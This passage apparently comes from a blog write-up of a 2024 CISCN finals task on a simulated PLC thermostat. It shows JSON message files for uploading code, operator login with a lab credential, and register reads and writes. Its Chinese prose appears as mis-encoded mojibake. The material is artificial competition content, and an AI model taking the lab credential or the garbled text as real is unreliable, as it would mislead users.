ä¿¡æ¯ï¼Œè¯•è¿è¡Œå¹¶å®Œæˆä»£ç ä¸Šä¼ åŠŸèƒ½ã€‚</p></blockquote><p>instance&#x2F;engineer&#x2F;user&#x2F;code_upload.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>(PLC_ENGINEER,LOGIC_UPLOAD)</code>æ•°æ®ç»“æ„ï¼š</p><table><thead><tr><th>å…ƒç´ åç§°</th><th>å…ƒç´ ç±»å‹</th><th>å…ƒç´ å¤§å°</th><th>ä¿¡æ¯å†…å®¹</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>plc_devname</td><td>0ç»“å°¾å­—ç¬¦ä¸²</td><td>&lt;&#x3D;32å­—èŠ‚</td><td>è®¾å¤‡çš„åç§°</td><td></td></tr><tr><td>logic_filename</td><td>0ç»“å°¾å­—ç¬¦ä¸²</td><td>&lt;&#x3D;32å­—èŠ‚</td><td>ä»£ç æ–‡ä»¶çš„åç§°</td><td></td></tr><tr><td>type</td><td>ENUM</td><td>4å­—èŠ‚</td><td>æ–‡ä»¶ç±»å‹</td><td>ä½¿ç”¨<strong>enum_plc_file_typeæšä¸¾</strong></td></tr><tr><td>uuid</td><td>UUID</td><td>32å­—èŠ‚</td><td>ä»£ç çš„æ‘˜è¦å€¼</td><td></td></tr><tr><td>author</td><td>0ç»“å°¾å­—ç¬¦ä¸²</td><td>&lt;&#x3D;32å­—èŠ‚</td><td>ä»£ç ä½œè€…çš„åç§°</td><td></td></tr><tr><td>uploader</td><td>0ç»“å°¾å­—ç¬¦ä¸²</td><td>&lt;&#x3D;32å­—èŠ‚</td><td>ä¸Šä¼ è¡Œä¸ºæ‰§è¡Œè€…åç§°</td><td></td></tr><tr><td>time</td><td>INT</td><td>4å­—èŠ‚</td><td>ä¸Šä¼ è¡Œä¸ºæ‰§è¡Œæ—¶é—´</td><td></td></tr></tbody></table><p>ä¿®æ”¹code_upload.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"thermostat_logic.c"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712110019651.png" alt="image-20240712110019651"></p><hr><h4 id="æ¨¡æ‹ŸäºŒè¿›åˆ¶é€»è¾‘ä¸Šä¼ "><a href="#æ¨¡æ‹ŸäºŒè¿›åˆ¶é€»è¾‘ä¸Šä¼ " class="headerlink" title="æ¨¡æ‹ŸäºŒè¿›åˆ¶é€»è¾‘ä¸Šä¼ "></a>æ¨¡æ‹ŸäºŒè¿›åˆ¶é€»è¾‘ä¸Šä¼ </h4><blockquote><p>ç¼–è¾‘task_1_1.shï¼Œåˆ é™¤å¯¹åº”ä»»åŠ¡çš„shå‰é¢çš„#å·ï¼Œæ‰“å¼€æ³¨é‡Šè¡Œï¼Œå¹¶åœ¨å·¥ç¨‹å¸ˆç”¨æˆ·ç›®å½•ä¸‹ç¼–å†™bin_upload.msgï¼Œå¡«å†™æ­£ç¡®çš„plcé€»è¾‘ä¿¡æ¯ï¼Œå†è¿è¡Œtask_1_1.sh,ä»¥å®ç°æ¨¡æ‹Ÿçš„äºŒè¿›åˆ¶é€»è¾‘ä¸Šä¼ ã€‚</p></blockquote><p>bin_upload.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆçœ‹ä¸€ä¸‹typeå¯¹åº”çš„æšä¸¾ç±»å‹ï¼š</p><p>æ–‡ä»¶ç±»å‹å®šä¹‰<code>emu_plc_file_type</code>ï¼ˆä½äºPLCæ¨¡æ‹Ÿæ“ä½œçš„plc_emu.jsonï¼‰</p><table><thead><tr><th>æšä¸¾é¡¹åç§°</th><th>æšä¸¾æ•°å€¼</th><th>å†…å®¹</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>FILE_CODE</td><td>0x01</td><td>ä»£ç æ–‡ä»¶</td><td></td></tr><tr><td>FILE_LOGIC</td><td>0x02</td><td>PLCé€»è¾‘æ–‡ä»¶</td><td>ç”±å¯¹åº”ä»£ç æ–‡ä»¶ç”Ÿæˆ</td></tr><tr><td>FILE_DESC</td><td>0x10</td><td>æè¿°æ–‡ä»¶</td><td>ä¿ç•™å¾…ä»¥åé€‰ç”¨</td></tr><tr><td>FILE_RULE</td><td>0x20</td><td>åˆ¶åº¦æ–‡ä»¶</td><td>ä¿ç•™å¾…ä»¥åé€‰ç”¨</td></tr></tbody></table><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712111831356.png" alt="image-20240712111831356"></p><p>ä¿®æ”¹bin_upload.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"libthermostat_logic.so"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_LOGIC"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712120702394.png" alt="image-20240712120702394"></p><hr><h4 id="æ¨¡æ‹ŸPLCé€»è¾‘å¯åŠ¨"><a href="#æ¨¡æ‹ŸPLCé€»è¾‘å¯åŠ¨" class="headerlink" title="æ¨¡æ‹ŸPLCé€»è¾‘å¯åŠ¨"></a>æ¨¡æ‹ŸPLCé€»è¾‘å¯åŠ¨</h4><blockquote><p>ç¼–è¾‘task_1_1.shï¼Œæ‰“å¼€â€œå¯åŠ¨plcè®¾å¤‡æ¨¡æ‹Ÿâ€æç¤ºåé¢çš„æ³¨é‡Šé¡¹ï¼Œè¿è¡Œtask_1_1.sh</p></blockquote><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712121057598.png" alt="image-20240712121057598"></p><p>è§‚å¯Ÿplcè®¾å¤‡å·¥ä½œç›®å½•instance&#x2F;plc&#x2F;device&#x2F;ä¸‹çš„message_logç›®å½•ï¼Œå‘ç°å…¶å¢åŠ äº†logic_send.logæ–‡ä»¶</p><blockquote><p>è¿™é‡Œmessage_logç›®å½•è®°å½•çš„æ˜¯å„ç”¨ä¾‹æ¨¡æ‹Ÿè¿è¡Œçš„è¿‡ç¨‹ï¼Œlogic_sendåˆ™æ˜¯åœ¨è®¾å¤‡å·¥ä½œç›®å½•ä¸‹é…ç½®çš„ç³»ç»Ÿè‡ªåŠ¨ç›‘æ§æµç¨‹çš„æ¨¡æ‹Ÿä¸šåŠ¡æµ</p></blockquote><p>instance&#x2F;plc&#x2F;device&#x2F;router_policy.cfg</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712121529217.png" alt="image-20240712121529217"></p><p>ä¸»è¦çœ‹ä¸‹åŠéƒ¨åˆ†</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"policy_head"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"logic_send"</span><span class="token punctuation">,</span>       <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"DELIVER"</span><span class="token punctuation">,</span>        <span class="token property">"sender"</span><span class="token operator">:</span><span class="token string">"logic"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"MATCH_RULES"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"OR"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"MODBUS_CMD"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"device"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"logic"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œç”¨æ¶ˆæ¯è·¯ç”±æ¥å°†å¤šä¸ªæ¨¡å—çš„åŠŸèƒ½ä¸²èµ·æ¥æ¨¡æ‹Ÿä¸šåŠ¡æµç¨‹ï¼š</p><ul><li><p>å¼€å¤´éƒ¨åˆ†æè¿°äº†<strong>æ¶ˆæ¯è·¯ç”±çš„åç§°ã€ç±»å‹å’Œèµ·å§‹æ¨¡å—</strong></p></li><li><p>ä¸­é—´éƒ¨åˆ†è¡¨ç¤º<strong>å½“æ¶ˆæ¯åœ¨èµ·å§‹æ¨¡å—ä½ç½®æ—¶çš„æ ¼å¼å’Œå†…å®¹ä¿¡æ¯</strong>ï¼š</p><p>å½“èµ·å§‹æ¨¡å—ç”Ÿæˆæ¶ˆæ¯(æ¨¡å—ä¸­ç”¨<code>message_create</code>å‡½æ•°ç”Ÿæˆï¼Œä¸”æœ€åæ¿€æ´»æ¶ˆæ¯å‚æ•°è®¾ä¸ºNULLæ—¶ï¼‰ä¸å…¶æ ¼å¼è¦æ±‚ä¸€è‡´æ—¶ï¼ˆåœ¨è¿™é‡Œå°±æ˜¯æ¶ˆæ¯ç±»å‹ä¸º<code>MODBUS_CMD</code>ï¼Œç”¨æ¥æ¨¡æ‹Ÿmodbusåè®®å‘½ä»¤)ï¼Œä¼šè¢«è¯†åˆ«ä¸ºè¯¥è·¯ç”±çš„èµ·å§‹æ¶ˆæ¯</p></li><li><p>æœ€åéƒ¨åˆ†åˆ™è¯´æ˜æ¶ˆæ¯<strong>å…ˆåé€šè¿‡deviceå’Œlogicæ¨¡å—</strong>åç»“æŸä¼ é€’ï¼šå®ƒå…¶å®æ¨¡æ‹Ÿäº†plcé€»è¾‘ï¼ˆç”¨logicæ¨¡å—æ¨¡æ‹Ÿï¼‰å‘å‡ºå‘½ä»¤ç»™device,ç”±deviceå¤„ç†åè¿”å›logicæ¨¡å—çš„è¿‡ç¨‹</p></li></ul><p>å½“ç³»ç»Ÿæ¨¡æ‹Ÿè¿è¡Œæ—¶ï¼Œè§‚å¯Ÿè®¾å¤‡å·¥ä½œç›®å½•instance&#x2F;plc&#x2F;deviceä¸­æ—¥å¿—ç›®å½•message_logä¸­çš„logic_send.msgæ–‡ä»¶å°†æ˜¾ç¤ºè¯¥è·¯ç”±ä¸­çš„ä¿¡æ¯ï¼Œç”±äºè¯¥è¿‡ç¨‹å¾ªç¯è¿›è¡Œï¼Œå› æ­¤å¯çœ‹åˆ°å¤§é‡ä¿¡æ¯</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712122119408.png" alt="image-20240712122119408"></p><hr><h4 id="æ¨¡æ‹Ÿæ“ä½œå‘˜ç™»å½•è¡Œä¸º"><a href="#æ¨¡æ‹Ÿæ“ä½œå‘˜ç™»å½•è¡Œä¸º" class="headerlink" title="æ¨¡æ‹Ÿæ“ä½œå‘˜ç™»å½•è¡Œä¸º"></a>æ¨¡æ‹Ÿæ“ä½œå‘˜ç™»å½•è¡Œä¸º</h4><blockquote><p>åœ¨task_1_1.shè„šæœ¬çš„â€œå¯åŠ¨hackerâ€æç¤ºã€â€œå¯åŠ¨æ“ä½œå‘˜ç«™â€æç¤ºå’Œâ€œæ‰§è¡Œæ“ä½œå‘˜ç™»å½•è¡Œä¸ºâ€æç¤ºåé¢æ‰“å¼€è¢«æ³¨é‡Šçš„å‘½ä»¤ï¼Œå¹¶ç¼–è¾‘æ“ä½œå‘˜ç”¨æˆ·å·¥ä½œç›®å½•ä¸‹çš„operator_login.msgï¼Œæ·»åŠ æ“ä½œå‘˜ç”¨æˆ·çš„åç§°å’Œå£ä»¤ä¿¡æ¯ï¼Œè€Œåè¿›è¡Œè¯•ç™»å½•ã€‚å¦‚ç™»å½•æˆåŠŸï¼Œåˆ™è¡¨æ˜é€šè¿‡è¯¥è¿‡ç¨‹ã€‚</p></blockquote><p>instance&#x2F;operator&#x2F;user&#x2F;operator_login.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å’Œå·¥ç¨‹å¸ˆç™»å½•ä¸€æ ·ï¼Œåœ¨<code>return_value</code>æ·»åŠ <code>ç”¨æˆ·å:å£ä»¤</code>ï¼Œç”¨æˆ·è¦é€‰æ‹©user.listé‡Œ<code>&quot;role&quot;:&quot;PLC_OPERATOR&quot;</code>çš„</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"qian:456"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712122832291.png" alt="image-20240712122832291"></p><hr><h4 id="æ¨¡æ‹Ÿæ“ä½œå‘˜çš„ä¸€ç»„plcæ“ä½œ"><a href="#æ¨¡æ‹Ÿæ“ä½œå‘˜çš„ä¸€ç»„plcæ“ä½œ" class="headerlink" title="æ¨¡æ‹Ÿæ“ä½œå‘˜çš„ä¸€ç»„plcæ“ä½œ"></a>æ¨¡æ‹Ÿæ“ä½œå‘˜çš„ä¸€ç»„plcæ“ä½œ</h4><blockquote><p>æ‰“å¼€task_1_1.shæœ€åå‡ æ¡æ³¨é‡Šæ‰çš„å‘½ä»¤ï¼Œç„¶åï¼Œä¿®æ”¹æ“ä½œå‘˜ç”¨æˆ·å·¥ä½œç›®å½•ä¸‹çš„plc_start.msg , plc_read_t.msgå’Œplc_set_t.msgï¼Œåˆ†åˆ«å®ç°æ‰“å¼€plcæ¸©åº¦è°ƒèŠ‚å¼€å…³ï¼Œè§‚å¯Ÿplcå½“å‰ç¯å¢ƒæ¸©åº¦ä»¥åŠå°†plcæ’æ¸©æ¸©åº¦è®¾ç½®ä¸º39åº¦ï¼ˆ3900ï¼‰çš„ç›®æ ‡</p></blockquote><p>instance&#x2F;operator&#x2F;user&#x2F;plc_start.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ON"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>instance&#x2F;operator&#x2F;user&#x2F;plc_read_t.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>instance&#x2F;operator&#x2F;user&#x2F;plc_set_t.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹ä¸€ä¸‹<code>(PLC_OPERATOR,PLC_CMD)</code>æ•°æ®ç»“æ„çš„å®šä¹‰ï¼š</p><table><thead><tr><th>å…ƒç´ åç§°</th><th>å…ƒç´ ç±»å‹</th><th>å…ƒç´ å¤§å°</th><th>ä¿¡æ¯å†…å®¹</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>plc_devname</td><td>0ç»“å°¾å­—ç¬¦ä¸²</td><td>&lt;&#x3D;32å­—èŠ‚</td><td>è®¾å¤‡çš„åç§°</td><td></td></tr><tr><td>action</td><td>ENUM</td><td>4å­—èŠ‚</td><td>æ“ä½œå‘˜çš„è¡Œä¸º</td><td>ä½¿ç”¨enum_plc_operator_action</td></tr><tr><td>action_desc</td><td>0ç»“å°¾å­—ç¬¦ä¸²</td><td>&lt;&#x3D;32å­—èŠ‚</td><td>æ“ä½œå‘˜è¡Œä¸ºæè¿°</td><td><strong>ä½¿ç”¨å¯„å­˜å™¨åç§°è¿›è¡Œæè¿°</strong></td></tr><tr><td>value</td><td>INT</td><td>4å­—èŠ‚</td><td>å¯„å­˜å™¨è®¾ç½®çš„å€¼</td><td></td></tr><tr><td>plc_operator</td><td>0ç»“å°¾å­—ç¬¦ä¸²</td><td>&lt;&#x3D;32å­—èŠ‚</td><td>æ“ä½œè€…çš„åç§°</td><td></td></tr><tr><td>time</td><td>INT</td><td>4å­—èŠ‚</td><td>æ“ä½œæ—¶é—´</td><td></td></tr></tbody></table><p>çœ‹ä¸€ä¸‹æ“ä½œå‘˜æ“ä½œç±»å‹å®šä¹‰ <code>enum_plc_operator_action</code>ï¼ˆä½äºplc_emu.jsonï¼‰</p><table><thead><tr><th>æšä¸¾é¡¹åç§°</th><th>æšä¸¾æ•°å€¼</th><th>å†…å®¹</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>ACTION_ON</td><td>0x01</td><td>å¼€å¯æ“ä½œ</td><td></td></tr><tr><td>ACTION_OFF</td><td>0x02</td><td>å…³é—­æ“ä½œ</td><td></td></tr><tr><td>ACTION_MONITOR</td><td>0x03</td><td>ç›‘è§†æ“ä½œ</td><td>è¯»å–å¯„å­˜å™¨ä¿¡æ¯</td></tr><tr><td>ACTION_ADJUST</td><td>0x04</td><td>è®¾ç½®æ“ä½œ</td><td>è°ƒèŠ‚æ’æ¸©è®¾ç½®ã€æ¡£ä½è®¾ç½®</td></tr></tbody></table><p>å†çœ‹ä¸€ä¸‹PLCè®¾å¤‡å¯„å­˜å™¨è®¾è®¡ï¼š</p><table><thead><tr><th>å¯„å­˜å™¨åç§°</th><th>å¯„å­˜å™¨ç±»å‹</th><th>å¯„å­˜å™¨åœ°å€</th><th>å¯„å­˜å™¨å†…å®¹</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>device_S</td><td>coil</td><td>1</td><td>æ’æ¸©ç®±å¼€å…³</td><td>0ä¸ºå…³é—­ï¼Œ1ä¸ºå¯åŠ¨</td></tr><tr><td>set_T</td><td>Holding Registers</td><td>40003</td><td>æ’æ¸©æ•°å€¼è¦æ±‚</td><td>çŸ­æ•´å‹</td></tr><tr><td>curr_T</td><td>Input Registers</td><td>30004</td><td>æ’æ¸©ç®±å½“å‰æ¸©åº¦</td><td>çŸ­æ•´å‹</td></tr><tr><td>heating_S</td><td>Coil</td><td>2</td><td>ç”µçƒ­ä¸å¼€å…³</td><td>0ä¸ºå…³ï¼Œ1ä¸ºåˆ¶çƒ­</td></tr><tr><td>heating_G</td><td>Holding Registers</td><td>40005</td><td>ç”µæµæ¡£ä½</td><td>0-9æ¡£</td></tr></tbody></table><p>ä¿®æ”¹plc_start.msgï¼Œæ‰“å¼€plcæ¸©åº¦è°ƒèŠ‚å¼€å…³ï¼ˆè¿™é‡Œæœ€é€†å¤©çš„æ˜¯è¦å¼€çš„æ˜¯ç”µçƒ­ä¸ï¼‰</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ON"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"heating_S"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹plc_read_t.msgï¼Œè§‚å¯Ÿplcå½“å‰ç¯å¢ƒæ¸©åº¦</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"MONITOR"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"curr_T"</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹plc_set_t.msgï¼Œå°†plcæ’æ¸©æ¸©åº¦è®¾ç½®ä¸º39åº¦ï¼ˆ3900ï¼‰</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token 